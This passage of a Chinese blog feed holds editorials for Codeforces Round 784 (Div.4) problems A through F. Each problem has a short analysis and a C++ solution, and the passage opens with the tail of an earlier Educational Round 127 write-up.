class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/5.png" alt="5"></p><p>1595分，加油上蓝！！！</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codeforces round 784(Div.4)解析</title>
      <link href="/2022/04/22/Codeforces%20Round%20784(Div.4)/"/>
      <url>/2022/04/22/Codeforces%20Round%20784(Div.4)/</url>
      
        <content type="html"><![CDATA[<p>今天来打个<a href="https://codeforces.com/contest/1669">div4</a>。</p><span id="more"></span><h2 id="A-Division"><a href="#A-Division" class="headerlink" title="A. Division?"></a>A. Division?</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这应该是描述了 <code>cf</code> 四个层次比赛的最高积分要求，超过将 <code>unrated</code> 进行比赛。直接按他的要求把四个等级判断输出一下就好了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">50</span>][<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1399</span>)&#123;</span><br><span class="line">        k=<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;=<span class="number">1599</span>)&#123;</span><br><span class="line">        k=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;=<span class="number">1899</span>)&#123;</span><br><span class="line">        k=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        k=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Division %d\n&quot;</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Triple"><a href="#B-Triple" class="headerlink" title="B. Triple"></a>B. Triple</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>随便输出一个出现过三次的数就好了，但是要注意出现之后不要马上结束，把剩下的输入读完。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(ma);</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">            ma[x]++;</span><br><span class="line">            <span class="keyword">if</span>(ma[x]==<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Odd-Even-Increments"><a href="#C-Odd-Even-Increments" class="headerlink" title="C. Odd/Even Increments"></a>C. Odd/Even Increments</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>偶数位置或者奇数位置同时+1，问能否达到全奇数或者全偶数的状态，直接判断奇数位置上是否全为奇数或者全为偶数和偶数位置上是否全为奇数或者全为偶数即可。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=a[i<span class="number">-2</span>]%<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">4</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=a[i<span class="number">-2</span>]%<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>有一个长度为2的红蓝印章，每次打印上去可以使相邻两个格子的颜色一个为红，一个为蓝，颜色可以覆盖。那么格子将出现三种状态：白，红，蓝。我们以白色方格作为分割，容易发现不可能存在长度为1的红色或者蓝色色块，所以只有一个格子的时候那个格子必为白色，不可能是红色或者蓝色。对于一个连续的色块，可以发现必须同时存在蓝色和红色。因此只要所有的连续色块满足这个要求就可以啦。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[n++]=<span class="string">&#x27;W&#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>,len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(len&gt;<span class="number">1</span>&amp;&amp;flag!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            len=<span class="number">0</span>;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            len++;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;R&#x27;</span>)&#123;</span><br><span class="line">                flag|=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">                flag|=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-2-Letter-Strings"><a href="#E-2-Letter-Strings" class="headerlink" title="E. 2-Letter Strings"></a>E. 2-Letter Strings</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/5.png" alt="5"></p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定若干个长度只有2的字符串，要求输出符合要求的对数，要求为两对字符串有且仅有1个位置字符不一样。由于数据点较小，我们很容易想到把字符串转int类型比较，由于字符只有11种，理论上可以一个char压缩字符串，但是我选择用short进行，因为复杂度绰绰有余。</p><p>然后对于转换成的整数类型进行比较，若发现高位或者低位相同，则将答案加上 $num[i]*num[j]$，题目已经提示long long，其它的也没啥了。</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">3000</span>;</span><br><span class="line"><span class="keyword">int</span> a[N+<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">        a[((s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)&lt;&lt;<span class="number">8</span>)|(s[<span class="number">1</span>]-<span class="string">&#x27;a&#x27;</span>)]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>( (i&amp;<span class="number">0x0000ff00</span>)==(j&amp;<span class="number">0x0000ff00</span>)||(i&amp;<span class="number">0x000000ff</span>)==(j&amp;<span class="number">0x000000ff</span>) )&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&amp;&amp;a[j])&#123;</span><br><span class="line">                    ans+=<span class="number">1ll</span>*a[i]*a[j];</span><br><span class="line">                    <span class="comment">//printf(&quot;0x%x 0x%x\n&quot;,i,j);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,a[0x101]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Eating-Candies"><a href="#F-Eating-Candies" class="headerlink" title="F. Eating Candies"></a>F. Eating Candies</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/6.png" alt="6"></p><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是一个人只能从左吃，另一个人只能从右开始吃，问最后吃的重量一样的情况下的最多糖果。这个直接贪心好了，如果左边人少了那就左边的人吃，否则右边的人吃，一旦重量一样了保存结果，最后输出即可。</p><h3 id="标程-5"><a href="#标程-5" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2e5</span>;</span><br><span class="line"><span class="keyword">int</span> w[N+<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>,j=n;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=j)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==b)&#123;</span><br><span class="line">            ans=i<span class="number">-1</span>+n-j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a&lt;b)&#123;</span><br><span class="line">            a+=w[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            b+=w[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,i,j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a==b)ans=n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    